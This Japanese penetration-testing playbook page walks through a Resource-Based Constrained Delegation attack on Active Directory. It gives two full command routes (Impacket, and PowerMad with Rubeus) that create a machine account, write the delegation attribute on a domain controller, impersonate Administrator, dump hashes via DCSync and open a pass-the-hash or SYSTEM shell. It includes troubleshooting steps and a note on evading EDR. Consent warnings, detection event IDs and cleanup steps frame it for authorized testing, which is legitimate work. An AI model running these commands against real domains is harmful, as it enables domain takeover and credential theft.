# RBCD（Resource-Based Constrained Delegation）攻撃

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [ ] 業務停止リスク（サービス・認証）
> - [ ] 持続化に該当
> - [x] 不可逆な設定変更を含む（マシンアカウント作成・msDS-AllowedToActOnBehalfOfOtherIdentity 属性の変更）
> - [x] SIEM/EDR で確実に検知される（Event ID 4741 マシンアカウント作成 / 4769 Kerberos S4U）
>
> 実施可否は事前合意で明示確認すること。作成したマシンアカウントの削除、RBCD 属性のクリーンアップが必須。演習環境（HTB / OSCP 等）では制約なし。

## 概要

対象コンピューターオブジェクトへの書き込み権限（GenericAll / GenericWrite）と、ドメインにコンピューターアカウントを追加できる権限（SeMachineAccountPrivilege）を組み合わせて Domain Admin レベルのアクセスを得る攻撃手法。

---

## 着火条件

以下の**両方**が満たされている場合：

1. 現在のユーザーが **対象コンピューター（通常はDC）に GenericAll または GenericWrite** を持つ
   - BloodHound で確認
2. 現在のユーザーが **`SeMachineAccountPrivilege`** を持つ（ドメインにコンピューターアカウントを追加できる）
   - `whoami /all` で確認

---

## 攻撃の原理

`msDS-AllowedToActOnBehalfOfOtherIdentity` 属性に「信頼するコンピューターアカウントのSID」を設定することで、そのコンピューターアカウントが対象コンピューターに対してなりすまし（impersonation）を行えるようになる。

攻撃フロー：
1. 攻撃用コンピューターアカウント（`[CASE_ID]_TEST$`等）を作成
2. DCの上記属性に `[CASE_ID]_TEST$` のSIDを書き込む
3. S4U2Self → S4U2Proxy の順で `Administrator` のサービスチケット（TGS）を取得
4. そのチケットでDCにアクセス → DCSync

---

## 実装ルートの選択

**2つの実装ルートがある。手元のシェルの種類で選ぶ：**

| 状況 | 使うルート |
|------|----------|
| Linuxのテスター端末から（Windowsシェル不要）| ルートA: Impacket（推奨。ツール依存が少ない） |
| evil-winrm / psexec 等でWindowsシェル取得済み | ルートB: PowerMad + Rubeus（Windows上で完結） |

---

## ルートA: Impacket ベース（Linux側から実行）

### Step 1: コンピューターアカウントを作成

```bash
# [Attacker]
impacket-addcomputer \
  -computer-name '[CASE_ID]_TEST$' \
  -computer-pass '[ATTACKER_CHOSEN_PASSWORD]' \
  -dc-ip [DC_IP] \
  '[DOMAIN]/[CURRENT_USER]:[PASSWORD]'
```

成功すると：`Successfully added machine account [CASE_ID]_TEST$ with password [ATTACKER_CHOSEN_PASSWORD]`

### Step 2: DCの RBCD 属性を設定

```bash
# [Attacker]
impacket-rbcd \
  -delegate-to '[DC_HOSTNAME]$' \
  -delegate-from '[CASE_ID]_TEST$' \
  -action write \
  -dc-ip [DC_IP] \
  '[DOMAIN]/[CURRENT_USER]:[PASSWORD]'
```

成功すると：`Delegation rights modified successfully!`

### Step 3: Administrator のサービスチケットを取得

```bash
# [Attacker]
impacket-getST \
  -spn 'cifs/[DC_FQDN]' \
  -impersonate administrator \
  -dc-ip [DC_IP] \
  '[DOMAIN]/[CASE_ID]_TEST$:[ATTACKER_CHOSEN_PASSWORD]'
```

成功すると `administrator@cifs_[DC_FQDN]@[DOMAIN].ccache` が生成される。

### Step 4: チケットを使って DCSync

**事前準備（必須）：**

```bash
export KRB5CCNAME=./administrator@cifs_[DC_FQDN]@[DOMAIN].ccache   # [Attacker]
```

```bash
# [Attacker]
impacket-secretsdump \
  -k -no-pass \
  -just-dc-ntlm \
  -target-ip [DC_IP] \
  administrator@[DC_FQDN]
```

### Step 5: Pass-The-Hash で接続

```bash
# [Attacker]
evil-winrm -i [DC_IP] -u Administrator -H '[NTLM_HASH]'
```

---

## ルートB: PowerMad + Rubeus（Windowsシェル内から実行）

### 着火条件（ルートBを選ぶ場合）

evil-winrm 等でターゲットのWindowsシェルを取得しており、
かつターゲット環境からインターネットにアクセスできないためLinux側ツールが使えない場合や、
Windowsシェル内で完結させたい場合に選ぶ。

**攻撃者の思考トレース：** ルートAの Impacket が使えない（ファイアウォール・時刻ずれ・Kerberos設定の問題等）とき、
Windows上の PowerMad と Rubeus で同等の攻撃を完結できる。
Windows標準モジュール（ActiveDirectory PowerShell）を使うため認証プロトコルの互換性問題が起きにくい。

### 準備：ツールの入手とアップロード

以下の2つを事前にテスター端末に用意し、evil-winrm 経由でアップロードする：

- **PowerMad**（`dirkjanm/PowerMad`）: マシンアカウント作成 PowerShell モジュール。GitHub から取得（インターネット要）
- **Rubeus**（`GhostPack/Rubeus`）: Kerberos S4U 攻撃用の .NET ツール。GitHub Releases から取得（インターネット要）

```bash
# [Attacker] evil-winrm セッションから順にアップロード
upload Powermad.ps1
upload Rubeus.exe
```

### Step 1: PowerMad でマシンアカウントを作成する

```powershell
# [Target] Powermad モジュールをインポート
. ./Powermad.ps1

# [Target] 攻撃用マシンアカウントを作成（案件識別子付きの名前を使う）
New-MachineAccount -MachineAccount '[CASE_ID]-COMP$' `
  -Password $(ConvertTo-SecureString '[ATTACKER_CHOSEN_PASSWORD]' -AsPlainText -Force)
# 成功すると: [+] Machine account [CASE_ID]-COMP$ added
```

作成したアカウントのSIDを確認する（次のステップで必要）：

```powershell
# [Target]
Get-ADComputer -Identity '[CASE_ID]-COMP$' | Select-Object Name, SID
```

### Step 2: DCのRBCD属性を設定する

Windows標準の Active Directory モジュール（DCには通常プリインストール済み）を使う：

```powershell
# [Target] DCの PrincipalsAllowedToDelegateToAccount に作成したアカウントを設定
Set-ADComputer -Identity [DC_HOSTNAME] `
  -PrincipalsAllowedToDelegateToAccount '[CASE_ID]-COMP$'

# [Target] 設定が反映されたことを確認
Get-ADComputer -Identity [DC_HOSTNAME] -Properties PrincipalsAllowedToDelegateToAccount |
  Select-Object Name, PrincipalsAllowedToDelegateToAccount
```

`PrincipalsAllowedToDelegateToAccount` に `CN=[CASE_ID]-COMP$,...` が表示されれば設定成功。

### Step 3: Rubeus でマシンアカウントのパスワードハッシュを計算する

S4U攻撃にはNTLMハッシュ（rc4_hmac）が必要：

```powershell
# [Target]
.\Rubeus.exe hash /password:[ATTACKER_CHOSEN_PASSWORD] /user:'[CASE_ID]-COMP$' /domain:[DOMAIN]
```

出力の `rc4_hmac` の値を控える（例：`[RC4_HASH]`）。

### Step 4: Rubeus S4U 攻撃でサービスチケットを取得する

```powershell
# [Target]
.\Rubeus.exe s4u `
  /user:'[CASE_ID]-COMP$' `
  /rc4:[RC4_HASH] `
  /impersonateuser:Administrator `
  /msdsspn:'cifs/[DC_FQDN]' `
  /domain:[DOMAIN] `
  /ptt
```

`/ptt`（Pass-the-Ticket）フラグを指定すると、取得したチケットがそのままWindowsセッションに注入される。
`[+] Ticket successfully imported!` が出れば成功。

出力の末尾にある Base64 エンコードされたチケット（`doI...` で始まる長い文字列）を控えておく。
Windowsシェルから直接アクセスできない場合（Linux側のImpacketで使う場合）は次のステップへ。

### Step 5（Windowsセッション内で使う場合）: klist でチケットを確認してアクセスする

```powershell
# [Target] /ptt で注入したチケットを確認
klist

# [Target] チケットでDCの管理共有にアクセスできることを確認
dir \\[DC_FQDN]\C$
```

### Step 5（Linux側で使う場合）: チケットをLinuxへ持ち出してpsexecで接続する

Base64チケットをファイルに保存し、Linux側で変換して使う：

```bash
# [Attacker] Rubeus の出力から Base64 チケットをコピーしてファイルに保存
# ※ 改行・空白を除去してから保存する（cat ticket.kirbi.b64 | tr -d '\n ' > ticket.kirbi.b64 でも可）
cat > ticket.kirbi.b64 << 'EOF'
[Rubeusが出力したBase64チケット（改行なしの一行）]
EOF

# [Attacker] Base64 デコードして kirbi 形式に変換
base64 -d ticket.kirbi.b64 > ticket.kirbi

# [Attacker] Impacket の ticketConverter で ccache 形式に変換
impacket-ticketConverter ticket.kirbi ticket.ccache
```

**事前準備（必須）：**

```bash
export KRB5CCNAME=./ticket.ccache   # [Attacker]
```

```bash
# [Attacker] psexec で SYSTEM シェルを取得
impacket-psexec [DOMAIN]/administrator@[DC_FQDN] -k -no-pass
```

`nt authority\system` が返れば RBCD 攻撃成功。

---

## トラブルシューティング

| 症状 | ルート | 原因・対処 |
|------|--------|-----------|
| `Kerberos SessionError: KRB_AP_ERR_SKEW` | A/B | 時刻のずれ。`sudo ntpdate [DC_IP]`（Linux）または `w32tm /resync`（Windows）で同期 |
| チケット取得に失敗 | A | FQDN（完全修飾ドメイン名）を使っているか確認。`/etc/hosts` への登録を確認 |
| `getST` がエラー | A | `-dc-ip` と `-spn` の FQDN が一致しているか確認 |
| `New-MachineAccount` が失敗 | B | `ms-DS-MachineAccountQuota` が0になっている場合がある。`Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota` で確認 |
| `Set-ADComputer` が Access Denied | B | 現在のユーザーが対象コンピューターに GenericAll/GenericWrite を持っているか再確認。グループ経由の権限の場合、ログオフ後に再ログインが必要なことがある |
| Rubeus s4u が `KRB5KDC_ERR_BADOPTION` | B | SPNが存在しないか、DCが委任設定を認識していない。RBCD属性設定後 1〜2 分待ってから再試行する |
| Base64チケットの変換後に psexec がエラー | B→A | チケットに空白・改行が混入している。`cat ticket.kirbi.b64 \| tr -d ' \n' > ticket_clean.b64` で整形してから再変換 |

---

## 注意点・落とし穴

- `-spn 'cifs/[DC_FQDN]'` の `[DC_FQDN]` は `[DC_HOSTNAME].[DOMAIN_FQDN]` のような完全修飾名にする（IPではKerberosが通らない）
- `KRB5CCNAME` 環境変数は `export` でセッションに設定する（sudo で実行する場合は `-E` オプション）
- マシンアカウントの作成上限（デフォルト10台 / ドメイン管理者が変更している場合もある）に達している場合は、既存のマシンアカウントを制御できる場合のみそれを利用する
- ルートB の Rubeus.exe は多くの AV/EDR で検知される。本番では検知回避手段（難読化ビルド・メモリ内実行等）を事前合意の上で実施する

---

### 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。マシンアカウント作成と DC への RBCD 属性書き込みを伴うため、ドメイン全体への影響と監査ログ痕跡が残る
- **想定されるSIEM/EDR検知**:
  - Event ID 4741（コンピューターアカウント作成）
  - Event ID 4742（コンピューターアカウントの属性変更：msDS-AllowedToActOnBehalfOfOtherIdentity）
  - Event ID 4769（Kerberos サービスチケット要求：S4U2Self / S4U2Proxy が短時間に発生）
  - Defender for Identity の RBCD アラート
- **業務影響リスク**: なし（読み取り操作の組み合わせだが、属性変更による設定汚染が残る）
- **原状回復必須項目**:
  - ✅ 作成したマシンアカウント（`[CASE_ID]_TEST$`）の削除
  - ✅ 対象コンピューターの `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性のクリア（`impacket-rbcd -action remove` または属性をnullに戻す）
  - ✅ 取得した `.ccache` チケットファイルの破棄
  - ✅ DCSync で取得した NTLM ハッシュは Credential_Dumping.md の原状回復項目に従う
- **取得情報の取扱**: 取得したチケット・NTLM ハッシュは暗号化保管、案件終了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術
- 前：GenericAll の確認 → `../ACE_Abuse/GenericAll.md`
- 前：BloodHound でパスを発見 → `../../05_Tools_Reference/BloodHound.md`
- 後：DCSync実行後 → `../Credential_Dumping.md`
- Unconstrained Delegation との違い → `./Unconstrained.md`
